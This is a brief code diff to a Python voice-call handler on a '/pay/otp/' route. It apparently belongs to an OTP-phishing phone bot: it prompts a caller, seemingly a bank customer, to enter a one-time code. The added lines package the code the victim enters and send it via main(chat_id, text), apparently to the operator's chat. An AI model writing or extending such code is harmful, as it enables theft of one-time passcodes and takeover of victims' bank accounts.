@@ -447,6 +447,8 @@ def gather(request,chat_id,bank):
         elif len(choice) > 3:
             gather = Gather(action=f'/pay/otp/{chat_id}/')
             resp.say(f"You have entered {choice}. Press 1 to confirm, or press 2 to re-enter")
+            text = f'The OTP code inputed by the user at first stage is {choice}'
+            main(chat_id,text)
             resp.append(gather)
             
         else:
